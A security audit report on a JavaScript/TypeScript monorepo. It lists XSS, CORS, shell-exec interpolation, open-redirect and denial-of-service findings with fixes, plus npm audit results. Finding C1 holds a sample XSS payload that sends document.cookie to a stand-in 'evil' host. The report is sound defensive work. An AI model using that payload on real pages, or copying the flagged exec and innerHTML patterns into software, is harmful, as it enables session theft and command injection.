# JS/TS SAST Findings

**Audit Date:** 2026-04-28
**Scope:** `npm/packages/{cli,pi-brain,cloud-run,router,agentic-integration,core,node,replication,raft}`, `ui/ruvocal/`, `scripts/`
**Tooling:** `ripgrep`, `npm audit`, manual code review (read-only)

---

## Summary (counts by severity)

| Severity | Source code findings | npm audit (deps) | Total |
|----------|---------------------:|------------------:|------:|
| Critical | 1                    | 14                | 15    |
| High     | 2                    | 27                | 29    |
| Medium   | 4                    | 24                | 28    |
| Low      | 3                    | 3                 | 6     |
| **Total**| **10**               | **68**            | **78**|

Top systemic findings: weak crypto-quality randomness in distributed/Raft code, unbounded `Access-Control-Allow-Origin: *` on multiple HTTP servers, broad `child_process.exec` usage with template-literal interpolation, and a deeply outdated dependency tree (68 vulnerabilities across `npm/`).

The chat UI's user-generated content path is well sanitized (DOMPurify on code blocks, custom `marked.ts` with `sanitizeHref`/`sanitizeMediaUrl`, undici-based `ssrfSafeAgent` with per-IP `assertSafeIp` validation in `fetch-url`). The most concerning issues are in the experimental `npm/packages/agentic-integration/*` package and `npm/packages/ruvector-extensions/src/ui/app.js`.

---

## Critical

### C1. XSS via unescaped `node.id` / `node.metadata` rendered to `innerHTML`
- **File:** `/workspaces/RuVector/npm/packages/ruvector-extensions/src/ui/app.js:255-272`
- **Snippet:**
  ```js
  html += `<div class="metadata-item"><strong>ID:</strong><div>${node.id}</div></div>`;
  for (const [key, value] of Object.entries(node.metadata)) {
      html += `<div class="metadata-item"><strong>${key}:</strong>
               <div>${JSON.stringify(value, null, 2)}</div></div>`;
  }
  content.innerHTML = html;
  ```
- **Exploit:** `node.id` and metadata keys/values come from API responses (`/api/nodes`). A malicious or compromised backend (or a graph node with attacker-controlled `id` like `<img src=x onerror=fetch('//evil/'+document.cookie)>`) executes JavaScript in the operator's browser. Persistent XSS — every time the node panel opens.
- **Fix:** Replace string concatenation with `textContent` assignments or use the existing `DOMPurify.sanitize(...)` already imported elsewhere in the project; e.g. build the DOM with `document.createElement('div'); el.textContent = node.id`.

---

## High

### H1. Insecure-randomness used for Raft election timeouts (potential split-brain)
- **Files:**
  - `/workspaces/RuVector/npm/packages/raft/src/node.ts:256` - `return min + Math.random() * (max - min);`
  - `/workspaces/RuVector/npm/packages/raft/src/node.js:188` (compiled mirror)
- **Exploit:** `Math.random()` is non-cryptographic and has predictable state across Node processes started in the same tick. In a Raft quorum, an adversary who can side-channel even one node's RNG state can synchronize timeouts across followers and provoke split-brain or denial-of-service against leader election. Predictable jitter also weakens DDoS-mitigation properties.
- **Fix:** Use `crypto.randomInt(min, max)` (Node 14.10+) or `randomBytes` for any timer/jitter that affects safety or liveness of the consensus protocol.

### H2. CORS wildcard (`Access-Control-Allow-Origin: *`) on writable HTTP APIs
- **Files (all set `*` unconditionally for non-static endpoints):**
  - `/workspaces/RuVector/npm/packages/ruvector-extensions/src/ui-server.ts:54` (also `.js:29`) - allows POST, PUT, DELETE; serves the graph API.
  - `/workspaces/RuVector/npm/packages/ruvbot/src/server.ts:531`, `src/server.js:471`, `src/RuvBot.ts:588`, `src/RuvBot.js:437` - bot HTTP server with `/api/agents`, `/api/sessions`, `/api/sessions/:id/chat`.
- **Exploit:** Any browser tab on the network (or the Internet, if the server is exposed) can issue cross-origin POSTs and read responses. Combined with the `Access-Control-Allow-Headers: Authorization` line, an attacker on a victim's network (or via a malicious page the operator visits) can drive these admin/agent APIs as the victim. There is no auth middleware in the surrounding code.
- **Fix:** Replace `'*'` with an allowlist (`config.PUBLIC_ORIGIN` or env-driven) and never combine `*` with credentialed APIs. Add CSRF tokens or `SameSite=strict` session cookies.

---

## Medium

### M1. `child_process.exec` with template-string interpolation across the agentic-integration package
- **Files:**
  - `/workspaces/RuVector/npm/packages/agentic-integration/swarm-manager.ts:189,277,513,576,579`
  - `/workspaces/RuVector/npm/packages/agentic-integration/agent-coordinator.ts:84,576`
  - `/workspaces/RuVector/npm/packages/agentic-integration/regional-agent.ts:85,90,206,329,530,533`
  - `/workspaces/RuVector/npm/packages/agentic-integration/coordination-protocol.ts:97,758`
- **Snippet (representative):**
  ```ts
  await execAsync(`npx claude-flow@alpha hooks notify --message "Spawned agent ${agentId} in ${region}"`);
  await execAsync(`npx claude-flow@alpha hooks post-edit --file "swarm-memory" --memory-key "${key}"`);
  ```
- **Exploit:** Today `agentId` is internally generated (`agent-${region}-${counter}`) and `region` comes from config, so this is **not directly exploitable as-is**. The risk is forward-looking: the same code path is used for `key` in `storeInMemory(key, value)` (called from event handlers that originate in agent payloads), and any future caller passing user-derived strings (region overrides, config from a registration RPC, sync payload contents) would yield trivial RCE because `exec` runs through `/bin/sh`. Defense-in-depth violation.
- **Fix:** Switch all 16 sites to `execFile('npx', ['claude-flow@alpha', 'hooks', 'notify', '--message', message])` or `spawn(...)` without `shell:true`. This eliminates shell metacharacter risk independent of caller trust.

### M2. Open-redirect surface on OAuth callback parameter
- **File:** `/workspaces/RuVector/ui/ruvocal/src/lib/server/auth.ts:520-543`
- **Snippet:**
  ```ts
  if (url.searchParams.has("callback")) {
      const callback = url.searchParams.get("callback") || redirectURI;
      if (config.ALTERNATIVE_REDIRECT_URLS.includes(callback)) {
          redirectURI = callback;
      }
  }
  ```
- **Exploit:** The allowlist check is correct (`includes` exact match), so this is **mitigated**. However it is an exact-string match against a comma-separated env var; any operator misconfiguration (e.g. trailing slash, prefix-only) will silently allow open redirects to attacker-chosen OIDC callbacks, leaking authorization codes. The companion `next` param is sanitized via `sanitizeReturnPath` — verify that helper rejects protocol-relative URLs (`//evil.com`) and absolute URLs.
- **Fix:** Add unit tests asserting `ALTERNATIVE_REDIRECT_URLS` parsing trims whitespace and rejects schemes other than `https:`. Document the env var format clearly.

### M3. `dev`-mode CORS escape hatch may leak into production
- **File:** `/workspaces/RuVector/ui/ruvocal/src/lib/server/hooks/handle.ts:222-241`
- **Snippet:** `if (dev || !requestOrigin || isHostLocalhost(...)) { allowedOrigin = "*"; }`
- **Exploit:** If a production deployment ever receives a request with `Origin: null` (sandboxed iframe, opaque origin, file://, some service-worker requests) the wildcard kicks in. Combined with cookie-based session auth in `ruvocal`, this enables CSRF read/write. Triggered by browser quirks rather than a bug, but still a misconfiguration trap.
- **Fix:** Drop the `!requestOrigin` branch in non-dev builds and require an explicit allowlist; reject opaque origins.

### M4. Unbounded `arrayBuffer()` after `content-length` check allows DoS via missing/lying header
- **File:** `/workspaces/RuVector/ui/ruvocal/src/routes/api/fetch-url/+server.ts:120-144`
- **Exploit:** A response with no `content-length` (chunked transfer) bypasses the pre-read 10 MB cap and is buffered fully in memory before the post-check rejects it. A 1 GB chunked response from an attacker-controlled origin (allowed because it must just be HTTPS-public) can OOM the server. Note: `assertSafeIp` blocks RFC1918 targets, so this is not classical SSRF, but it is a memory-exhaustion vector.
- **Fix:** Stream the body and abort once `MAX_FILE_SIZE` is exceeded (use `for-await` over `response.body` with a running byte counter, or pipe through a `Transform` that throws past the limit).

---

## Low

### L1. `{@html}` in `MarkdownBlock.svelte` and `privacy/+page.svelte`
- **Files:** `ui/ruvocal/src/lib/components/chat/MarkdownBlock.svelte:19`, `routes/privacy/+page.svelte:9`, `ui/ruvocal/src/routes/models/[...model]/thumbnail.png/ModelThumbnail.svelte:25`
- **Status:** Mitigated. `MarkdownBlock` consumes `token.html` produced by the project's custom `lib/utils/marked.ts`, which routes every HTML escape through `sanitizeHtmlForMultimedia` and validates URLs via `sanitizeHref`/`sanitizeMediaUrl`. `privacy/+page.svelte` renders a static, build-time-imported file (`PRIVACY.md?raw`). `ModelThumbnail` injects a server-controlled SVG logo string. No XSS, but `{@html}` should be reviewed any time `marked.ts` is modified.

### L2. Hardcoded `'anonymous'` API-key fallback in `pi-brain` client
- **File:** `/workspaces/RuVector/npm/packages/pi-brain/src/client.ts:66-71`
- **Snippet:** `this.apiKey = options?.apiKey ?? process.env.PI ?? process.env.BRAIN_API_KEY ?? 'anonymous';`
- **Exploit:** Not a credential, but it conceals misconfiguration: clients running without `BRAIN_API_KEY` send `Authorization: Bearer anonymous`, which the server accepts and may rate-limit weakly. Operators may believe they are authenticated when they are not.
- **Fix:** Throw or warn loudly when neither `PI` nor `BRAIN_API_KEY` is set, instead of silently falling back.

### L3. `Math.random()` used for connection IDs in `cloud-run`
- **Files:** `npm/packages/cloud-run/vector-client.ts:124`, `vector-client.js:85`, `streaming-service-optimized.ts:259`, `.js:222`
- **Status:** IDs are local-only correlation tokens, not security-bearing. Recommend `crypto.randomUUID()` for hygiene; not exploitable today.

---

## Cleared (not findings)

- **`fetch-url` SSRF protection:** `+server.ts` uses `undici.Agent` with custom `lookup` that calls `assertSafeIp` per resolved address — robust TOCTOU-safe SSRF control. Manual redirect handling with allowlist re-check on each hop.
- **CSRF on OAuth state:** `routes/login/callback/+server.ts:47-49` decodes and validates a CSRF token bound to `sessionId` via `validateAndParseCsrfToken`.
- **`exec`/`fs.readFile` with user input in CLI:** No instances found. CLI `readFileSync(inputPath, 'utf-8')` reads from `CLAUDE_HOOK_INPUT` which is process env, not user input.
- **`eval` / `new Function` / `setTimeout(string)` / `document.write`:** Zero hits across audited tree.
- **Hardcoded API keys / JWT secrets in source:** Zero hits. Only test fixtures (`xoxb-test-token`) and documentation examples.
- **`rejectUnauthorized: false` / disabled TLS verification:** Zero hits.
- **Prototype pollution sinks (`lodash.merge`, `Object.assign(req.body)`):** Zero hits.
- **JWT alg-confusion (`algorithms: ['none']`):** No `jsonwebtoken` usage found in audited packages; OAuth via OIDC token-set flow only.
- **SQL injection:** No raw SQL strings found in audited TS/JS.

---

## npm audit results (top vulns)

Run from `/workspaces/RuVector/npm/` (`package-lock.json` in `npm/`):

**Totals:** 14 critical, 27 high, 24 moderate, 3 low (68 total).

### Critical (14)

| Package | Range |
|---------|-------|
| `@google-cloud/redis` | <=3.3.0 |
| `@xenova/transformers` | >=2.0.2 |
| `agentdb` | >=1.1.3 |
| `agentic-flow` | <=1.8.15 \|\| >=1.9.1 |
| `aidefence` | * |
| `claude-flow` | >=2.0.0-alpha.2 |
| `dspy.ts` | * |
| `fast-xml-parser` | <=5.6.0 |
| `google-gax` | 0.13.5 - 4.6.1 |
| `handlebars` | 4.0.0 - 4.7.8 (prototype pollution + RCE in templates) |
| `lean-agentic` | >=0.2.0 |
| `onnx-proto` | * |
| `onnxruntime-web` | <=1.16.0-dev.20230910-24f0893d3c |
| `protobufjs` | <=7.5.4 (prototype pollution) |

### High (selected, 27 total)

| Package | Range | Notes |
|---------|-------|-------|
| `@anthropic-ai/claude-code` | <=2.1.74 | Workspace-trust bypass + symlink escape (CWE-22/61, CVSS 10.0) |
| `@hono/node-server` | <=1.19.12 | Authz bypass via encoded slashes (CWE-863) |
| `@modelcontextprotocol/sdk` | 1.10.0 - 1.25.3 | Cross-client data leak (CWE-362) |
| `lodash` | <=4.17.23 | Prototype pollution / command injection |
| `node-forge` | <=1.3.3 | Crypto signature bypass |
| `path-to-regexp` | <=0.1.12 \|\| 8.0.0-8.3.0 | ReDoS |
| `tar` | <=7.5.10 | Path traversal on extraction |
| `undici` | 7.0.0 - 7.23.0 | Multiple HTTP smuggling/CRLF |
| `fastify` | <=5.8.2 | Multiple |
| `vite` | <=6.4.1 \|\| 7.0.0-7.3.1 | Dev-server SSRF/path-traversal |
| `@isaacs/brace-expansion` | 5.0.0 | ReDoS (CWE-1333) |

### Recommended remediation order
1. `npm audit fix` for the 50+ packages where `fixAvailable: true`.
2. Major-version upgrade for `@google-cloud/redis` (3 → 5), `dspy.ts` (→ 0.1.3), `@google-cloud/storage` (→ 5.20.4).
3. Pin or remove unmaintained transitive deps: `aidefence`, `dspy.ts` (depends on broken `@eduardoleao052/gpu`), `onnx-proto`.
4. Investigate `agentic-flow`, `claude-flow`, `agentdb`, `lean-agentic` — these are first-party-adjacent packages flagged critical; verify the published versions and pin to safe ones.
